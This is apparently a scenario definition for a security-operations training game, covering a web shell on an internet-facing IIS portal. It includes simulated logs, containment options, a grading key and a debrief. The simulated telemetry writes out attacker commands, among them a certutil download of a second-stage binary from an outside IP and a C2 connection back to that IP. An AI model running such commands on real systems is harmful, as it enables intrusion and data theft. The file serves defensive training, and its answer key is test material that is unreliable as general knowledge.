// An internet-facing server answering commands. The alert catches the tail of
// it — one cmd.exe — and the web logs show the access started three days ago.
// Everything here turns on not destroying the evidence while you contain it.
//
// See ./index.js for the shape every scenario follows.

export default {
  id: 'web-shell-upload',
  difficulty: 3,
  queueLabel: 'EDR Alert — IIS worker process spawned a command shell, WEB-PROD-02',
  source: 'CrowdStrike EDR',
  alert: {
    ref: 'ALT-2026-0821-0604',
    rule: 'Web server process spawned a command interpreter',
    ruleId: 'CS-2026-1183',
    reportedSeverity: 'HIGH',
    detectedAt: '2026-08-21 10:16:42 UTC',
    slaMinutes: 30,
    entities: [
      { label: 'Host', value: 'WEB-PROD-02' },
      { label: 'Parent', value: 'w3wp.exe (IIS app pool: DocPortal)' },
      { label: 'Child', value: 'cmd.exe /c whoami /all' },
    ],
  },
  rawLog:
`{"timestamp":"2026-08-21T10:16:42Z","host":"WEB-PROD-02","detect":"Web server process spawned a command interpreter","parent":{"name":"w3wp.exe","user":"IIS APPPOOL\\\\DocPortal","cmdline":"c:\\\\windows\\\\system32\\\\inetsrv\\\\w3wp.exe -ap DocPortal"},"child":{"name":"cmd.exe","cmdline":"cmd.exe /c whoami /all"},"action":"detected, not blocked","policy":"DocPortal servers — detect only pending app owner sign-off"}`,
  datasets: [
    { index: 'edr', label: 'CrowdStrike process telemetry', retention: '90d' },
    { index: 'web', label: 'IIS access logs', retention: '30d' },
    { index: 'asset', label: 'Asset inventory & ownership', retention: 'current state' },
    { index: 'net', label: 'Perimeter firewall / netflow', retention: '30d' },
  ],
  searches: [
    {
      id: 's10-edr-tree',
      label: 'process activity on WEB-PROD-02',
      match: { index: 'edr', terms: ['web-prod-02'] },
      needsWindow: 240,
      columns: ['_time', 'user', 'process', 'command_line'],
      events: [
        { _time: '10:16:42', user: 'IIS APPPOOL\\DocPortal', process: 'cmd.exe', command_line: 'whoami /all' },
        { _time: '10:17:05', user: 'IIS APPPOOL\\DocPortal', process: 'cmd.exe', command_line: 'net user /domain svc-docportal' },
        { _time: '10:19:33', user: 'IIS APPPOOL\\DocPortal', process: 'cmd.exe', command_line: 'dir \\\\FS-LOAN-01\\loanfiles' },
        { _time: '10:24:11', user: 'IIS APPPOOL\\DocPortal', process: 'certutil.exe', command_line: 'certutil -urlcache -f http://103.163.220.47/sq.exe c:\\windows\\temp\\sq.exe' },
        { _time: '10:25:02', user: 'IIS APPPOOL\\DocPortal', process: 'sq.exe', command_line: 'c:\\windows\\temp\\sq.exe -connect 103.163.220.47:8443' },
      ],
      note: 'Identify the account, enumerate the domain, look at a file share, then pull a second-stage binary with certutil and connect out. That is a foothold being developed into access, not a one-off command.',
    },
    {
      id: 's10-web-access',
      label: 'IIS requests for the uploaded page',
      match: { index: 'web', terms: ['status.aspx'] },
      needsWindow: 10080,
      columns: ['_time', 'client_ip', 'method', 'uri', 'status', 'bytes'],
      events: [
        { _time: 'Aug 18 02:14', client_ip: '103.163.220.47', method: 'POST', uri: '/uploads/customer-docs/status.aspx', status: '200', bytes: '1,412' },
        { _time: 'Aug 18 02:16', client_ip: '103.163.220.47', method: 'POST', uri: '/uploads/customer-docs/status.aspx', status: '200', bytes: '3,981' },
        { _time: 'Aug 19 22:51', client_ip: '103.163.220.47', method: 'POST', uri: '/uploads/customer-docs/status.aspx', status: '200', bytes: '2,204' },
        { _time: 'Aug 21 10:16', client_ip: '103.163.220.47', method: 'POST', uri: '/uploads/customer-docs/status.aspx', status: '200', bytes: '5,870' },
      ],
      note: 'The page lives in the customer document upload directory, which should only ever hold uploaded PDFs, and it has been answering POSTs from one address since Tuesday. The EDR alert is day four of this, not hour one.',
    },
    {
      id: 's10-asset-host',
      label: 'asset record for WEB-PROD-02',
      match: { index: 'asset', terms: ['web-prod-02'] },
      needsWindow: 0,
      columns: ['field', 'value'],
      events: [
        { field: 'Function', value: 'Customer document upload portal — internet-facing' },
        { field: 'Data', value: 'Uploaded loan documents pending processing (PII)' },
        { field: 'Owner', value: 'Lending Technology' },
        { field: 'Patch level', value: 'Application framework 3 versions behind; deserialisation fix from June not applied' },
        { field: 'Sensor policy', value: 'Detect-only — prevention never enabled on this app pool' },
        { field: 'Segmentation', value: 'Can reach FS-LOAN-01 and the DocPortal database' },
      ],
      note: 'Internet-facing, unpatched, holding customer PII, in detect-only mode, and able to reach a file server. Every one of those is a line in the report.',
    },
    {
      id: 's10-net-egress',
      label: 'outbound connections from WEB-PROD-02',
      match: { index: 'net', terms: ['103.163.220.47'] },
      needsWindow: 10080,
      columns: ['_time', 'src', 'dest', 'port', 'bytes_out', 'note'],
      events: [
        { _time: 'Aug 18 02:19', src: 'WEB-PROD-02', dest: '103.163.220.47', port: '8443', bytes_out: '41 KB', note: 'first observed' },
        { _time: 'Aug 19 22:55', src: 'WEB-PROD-02', dest: '103.163.220.47', port: '8443', bytes_out: '2.6 MB', note: '—' },
        { _time: 'Aug 21 10:25', src: 'WEB-PROD-02', dest: '103.163.220.47', port: '8443', bytes_out: '118 MB', note: 'still open at time of alert' },
      ],
      note: '118 MB leaving an upload portal towards the same address that has been posting to the page. Treat that as data out until someone proves otherwise.',
    },
  ],
  intel: {
    '103.163.220.47': {
      verdict: 'malicious',
      summary: 'Command-and-control node associated with opportunistic exploitation of internet-facing .NET applications; observed hosting second-stage tooling.',
      firstSeen: '2026-07-29',
      sources: ['Internal blocklist', 'Commercial C2 feed', 'Financial sector ISAC advisory 2026-131'],
      context: 'The advisory documents the same sequence: deserialisation flaw, an .aspx file dropped in an upload directory, certutil to stage a beacon.',
    },
  },
  actions: [
    {
      id: 'isolate-host',
      label: 'EDR network containment — isolate WEB-PROD-02',
      verdict: 'required',
      result: 'Host isolated at 10:31. The session to 103.163.220.47 drops; the machine stays powered on and reachable to responders.',
    },
    {
      id: 'preserve-evidence',
      label: 'Preserve evidence: capture memory and snapshot the volume before any cleanup',
      verdict: 'required',
      result: 'Memory image and volume snapshot taken and hashed. The shell, the staged binary, and the connection state survive for IR.',
    },
    {
      id: 'block-c2',
      label: 'Block 103.163.220.47 at the perimeter',
      verdict: 'acceptable',
      result: 'Address blocked estate-wide. Useful, but it is not containment on its own — the shell is reachable from any address the attacker chooses next.',
    },
    {
      id: 'delete-webshell',
      label: 'Delete status.aspx from the upload directory and close the alert',
      verdict: 'harmful',
      result: 'The file is gone, along with its timestamps and contents. The staged binary at c:\\windows\\temp\\sq.exe still runs, still beacons, and there is now no artifact to tell IR what the shell could do.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'concerned',
        message: 'You deleted the single most important piece of evidence and left the implant behind. We now cannot say what the attacker ran or what they took, on a server holding customer loan documents. Contain first, preserve, then clean up under a plan.',
      },
    },
    {
      id: 'reboot-server',
      label: 'Reboot WEB-PROD-02 to clear the malicious process',
      verdict: 'harmful',
      result: 'Server rebooted. Volatile evidence is gone, the web shell is untouched on disk, and the portal is back online serving the internet with the same unpatched flaw.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'concerned',
        message: 'A reboot destroys memory evidence and removes nothing that persists on disk. The host came back up exposed, and now we are investigating an intrusion with half the evidence missing.',
      },
    },
    {
      id: 'notify-app-owner',
      label: 'Notify the Lending Technology on-call that the portal is being contained and why',
      verdict: 'acceptable',
      result: 'App owner informed before the portal goes dark, and confirms no maintenance or testing explains the traffic.',
    },
  ],
  truth: {
    classification: 'true_positive',
    severity: 'CRITICAL',
    mitreTechnique: 'T1505.003',
    mitreTactic: 'Persistence',
    escalation: 'escalate_ir',
    responseTargetMinutes: 15,
    requiredSearches: ['s10-edr-tree', 's10-web-access', 's10-asset-host'],
    requiredIntel: ['103.163.220.47'],
    requiredActions: ['isolate-host', 'preserve-evidence'],
    requiredReportPoints: [
      {
        point: 'identifies a web shell in the upload directory being used for remote command execution',
        any: ['web shell', 'webshell', 'status.aspx', 'aspx', 'remote command', 'command execution', 'uploaded page'],
      },
      {
        point: 'establishes the dwell time — access began on 18 August, three days before the alert',
        any: ['aug 18', 'august 18', 'three days', '3 days', 'dwell', 'since tuesday', 'not the first', 'earlier access'],
      },
      {
        point: 'describes the post-exploitation activity: enumeration, certutil download of a second stage, outbound C2',
        any: ['certutil', 'second stage', 'sq.exe', 'beacon', 'c2', 'command and control', 'enumerat*', 'whoami', 'net user'],
      },
      {
        point: 'states that the server is internet-facing and holds customer PII, so data exposure is in scope',
        any: ['internet-facing', 'internet facing', 'public', 'pii', 'customer', 'loan document*', '118 mb', 'data', 'exposure'],
      },
      {
        point: 'does not propose deleting the shell or rebooting before evidence is preserved',
        none: ['delete the file', 'delete status.aspx', 'remove the shell then', 'reboot the server', 'restart the server', 'clean it up and close'],
      },
    ],
  },
  walkthrough: [
    'Read the parent-child pair first. An IIS worker process running as the app pool identity does not spawn cmd.exe during normal operation; that single fact is enough to treat the host as compromised.',
    '`index=edr web-prod-02` gives the sequence: whoami, domain enumeration, a look at a loan file share, then certutil pulling sq.exe from 103.163.220.47 and connecting back on 8443. That is a foothold being developed.',
    'Look up 103.163.220.47 in the Intel tab — known C2 with an advisory describing exactly this pattern against unpatched .NET applications.',
    '`index=web status.aspx` over seven days is the finding that changes the severity: the page has been answering POSTs from that address since 18 August. You are on day four, not minute one.',
    '`index=asset web-prod-02` gives the business shape — internet-facing customer document portal, PII on disk, three framework versions behind, prevention never enabled, and a route to FS-LOAN-01.',
    'Contain in the right order: isolate with EDR (which keeps the machine up and reachable), then preserve memory and a volume snapshot. Deleting the shell or rebooting destroys the evidence and leaves the implant.',
    'Classify True Positive at CRITICAL, map to T1505.003, and escalate to IR. Blocking the C2 address and telling the app owner are both worth doing; neither is containment.',
  ],
  debrief:
`This is the scenario where the instinct to "clean it up" does the most damage. Deleting the web shell feels like remediation and is in fact evidence destruction that leaves the second stage running — and on a server holding customer loan documents, the questions that follow an intrusion are legal ones that depend entirely on what the evidence can show. Isolate, preserve, escalate; cleanup is a planned step later, owned by IR.

The other lesson is the time gap. The EDR alert fires on one command at 10:16, but the IIS logs put first access three days earlier — the detection saw the moment the attacker got noisy, not the moment they got in. Pivoting from endpoint telemetry to web logs is what turns a single alert into a scoped intrusion, and asset context turns a scoped intrusion into a business statement: internet-facing, unpatched, PII, detect-only, and a path to a file server.`,
};
